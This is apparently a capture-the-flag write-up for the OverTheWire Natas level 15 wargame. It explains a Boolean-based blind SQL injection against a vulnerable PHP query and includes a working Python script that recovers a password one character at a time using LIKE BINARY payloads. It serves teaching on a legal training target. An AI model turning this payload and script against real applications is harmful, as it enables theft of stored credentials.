# Natas Level 15 → Level 16 

## Description
The objective is to retrieve the password for the next level using a **Boolean-based Blind SQL Injection**.

## Vulnerability Analysis
Unlike previous levels, Natas 15 does not display the results of the SQL query or any database errors. The application only returns two states based on the query results:
1.  **"This user exists."** (The query returned 1 or more rows)
2.  **"This user doesn't exist."** (The query returned 0 rows)

The server executes the following vulnerable PHP code:
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
```

Since the input is not sanitized, we can inject SQL commands to "ask" the database true/false questions about the stored passwords.

## Exploit Logic
The provided Python script automates the process of guessing the password character by character.

### Technique: 
We use the LIKE BINARY operator.

### Payload:
natas16" AND password LIKE BINARY "{guessed_part + char}%

natas16": Closes the original username string.

AND password LIKE BINARY: Forces a case-sensitive comparison of the password.

"{password + char}%": Checks if the password starts with the currently guessed string plus a new character. The % acts as a wildcard for the remaining characters.

### Automation: 
The script iterates through an alphabet of a-z, A-Z, and 0-9 for each of the 32 positions of the password.

## Requirements
Python 3.x

requests library

To install the required library:

Bash
```
pip3 install requests
```

## Usage
Open the script and replace YOUR_NATAS15_PASSWORD with actual password for Level 15.

Run the script:

Bash
```
python3 solve.py
```
## Exploit Script (solve.py)
Python
```
import requests
from requests.auth import HTTPBasicAuth

target_url = "[http://natas15.natas.labs.overthewire.org/](http://natas15.natas.labs.overthewire.org/)"
auth = HTTPBasicAuth('natas15', 'YOUR_NATAS15_PASSWORD')

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
password = ""

print("[*] Starting brute-force for Natas 16 password...")

for i in range(32):
    for char in chars:
        # Constructing the payload
        payload = f'natas16" AND password LIKE BINARY "{password + char}%'
        
        response = requests.post(target_url, auth=auth, data={'username': payload})
        
        if "This user exists" in response.text:
            password += char
            print(f"[+] Found char: {char} | Current: {password}")
            break

print(f"\n[!] Final password for Natas 16: {password}")
```
